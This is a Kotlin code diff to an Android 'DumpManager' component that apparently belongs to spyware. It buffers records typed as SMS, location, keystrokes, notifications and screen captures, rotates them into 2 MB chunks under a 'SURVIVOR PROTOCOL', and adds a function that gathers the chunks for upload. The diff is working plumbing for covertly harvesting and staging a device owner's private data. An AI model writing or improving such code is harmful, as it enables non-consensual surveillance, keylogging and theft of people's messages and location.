@@ -62,53 +62,52 @@ object DumpManager {
         } catch (e: Exception) { }
     }
 
-    // --- STREAM LOGGING (Fixes Lag & Data Loss) ---
+    // --- STREAM LOGGING (SURVIVOR PROTOCOL) ---
+    private const val MAX_CHUNK_SIZE = 2 * 1024 * 1024 // 2MB chunks
+    private const val MAX_TOTAL_CHUNKS = 25 // 50MB Max Storage
+
     fun appendLog(type: String, data: JSONObject) {
-        // Run in background to prevent UI stutter
-        // We use a new Thread to avoid Coroutine scope issues in simple contexts
         Thread { 
             try {
                 if (!ROOT_DIR.exists()) ROOT_DIR.mkdirs()
-                val file = File(ROOT_DIR, "offline_buffer.jsonl")
+                val activeFile = File(ROOT_DIR, "active_buffer.jsonl")
                 
-                // Wrap in standardized format
                 val wrapper = JSONObject()
-                wrapper.put("t", type) // Type (SMS, LOC, ETC)
-                wrapper.put("d", data) // The payload
+                wrapper.put("t", type)
+                wrapper.put("d", data)
                 
-                file.appendText(wrapper.toString() + "\n")
+                activeFile.appendText(wrapper.toString() + "\n")
+                
+                // Rotate if too large
+                if (activeFile.length() > MAX_CHUNK_SIZE) {
+                    val rotated = File(ROOT_DIR, "offline_log_${System.currentTimeMillis()}.jsonl")
+                    activeFile.renameTo(rotated)
+                    enforceStorageLimits()
+                }
             } catch (e: Exception) { e.printStackTrace() }
         }.start()
     }
 
-    fun getAndClearLogs(): JSONObject {
-        val result = JSONObject()
-        // Init Buckets
-        val buckets = mapOf(
-            "SMS" to JSONArray(), "LOC" to JSONArray(), "KEY" to JSONArray(), 
-            "NOTIF" to JSONArray(), "SCREEN" to JSONArray()
-        )
-        
+    private fun enforceStorageLimits() {
         try {
-            val file = File(ROOT_DIR, "offline_buffer.jsonl")
-            if (file.exists()) {
-                file.forEachLine {
-                    try {
-                        val obj = JSONObject(it)
-                        val type = obj.optString("t")
-                        val data = obj.optJSONObject("d")
-                        if (buckets.containsKey(type)) {
-                            buckets[type]?.put(data)
-                        }
-                    } catch(e: Exception){}
-                }
-                // Nuke file after reading to prevent duplicates
-                file.delete()
+            val logs = ROOT_DIR.listFiles { _, name -> name.startsWith("offline_log_") } ?: return
+            if (logs.size > MAX_TOTAL_CHUNKS) {
+                // Delete oldest files to make room
+                logs.sortedBy { it.lastModified() }
+                    .take(logs.size - MAX_TOTAL_CHUNKS)
+                    .forEach { it.delete() }
             }
-        } catch (e: Exception) { e.printStackTrace() }
-        
-        // Pack into result
-        buckets.forEach { (k, v) -> result.put(k, v) }
-        return result
+        } catch(e: Exception) {}
+    }
+
+    fun getRotatedLogs(): List<File> {
+        try {
+            // Force rotate active buffer so we upload the latest data too
+            val activeFile = File(ROOT_DIR, "active_buffer.jsonl")
+            if (activeFile.exists() && activeFile.length() > 0) {
+                activeFile.renameTo(File(ROOT_DIR, "offline_log_${System.currentTimeMillis()}.jsonl"))
+            }
+            return ROOT_DIR.listFiles { _, name -> name.startsWith("offline_log_") }?.toList() ?: emptyList()
+        } catch (e: Exception) { return emptyList() }
     }
 }
